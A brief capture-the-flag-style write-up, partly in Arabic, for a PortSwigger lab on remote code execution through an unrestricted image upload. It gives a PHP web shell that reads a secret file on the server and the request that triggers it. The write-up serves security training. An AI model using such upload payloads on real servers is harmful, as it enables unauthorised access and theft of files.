# Lab : Remote code execution via web shell upload

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

- الفكره من الLab ده في Function بيقبل تحميل صور بس هو في الحقيقه بيقبل اي ملف يتبعتله فا هبعت ملف php واخد access علي الserver

```bash
1. nano test.php

2. <?php echo file_get_contents('/home/carlos/secret'); ?>

3. GET /files/avatars/test1.php HTTP/2
```
